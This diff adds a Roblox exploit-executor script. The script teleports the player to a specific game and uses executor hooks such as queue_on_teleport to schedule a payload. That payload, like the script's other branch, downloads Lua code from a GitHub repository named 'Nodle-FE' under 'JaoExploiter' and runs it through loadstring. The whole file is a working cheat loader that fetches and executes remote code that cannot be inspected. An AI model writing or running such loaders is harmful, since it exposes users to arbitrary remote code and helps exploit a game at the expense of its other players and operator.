@@ -1,0 +1,24 @@
+local target=15396672937
+local Players=game:GetService("Players")
+local TeleportService=game:GetService("TeleportService")
+local lp=Players.LocalPlayer
+local flag="exec_once_"..tostring(target)..".flag"
+if game.PlaceId==target then
+    if type(isfile)=="function" and isfile(flag) then return end
+    if type(loadstring)=="function" then
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/JaoExploiter/Nodle-FE/refs/heads/main/Source.lua"))()
+    end
+    if type(writefile)=="function" then writefile(flag,"1") end
+    return
+end
+if type(isfile)=="function" and isfile(flag) then return end
+local payload = [==[
+if type(isfile)=="function" and isfile("exec_once_15396672937.flag") then return end
+if type(loadstring)=="function" then
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/JaoExploiter/Nodle-FE/refs/heads/main/Source.lua"))()
+end
+if type(writefile)=="function" then writefile("exec_once_15396672937.flag","1") end
+]==]
+local q = queue_on_teleport or (syn and syn.queue_on_teleport) or (fluxus and fluxus.queue_on_teleport) or nil
+if q then q(payload) end
+TeleportService:Teleport(target,lp)
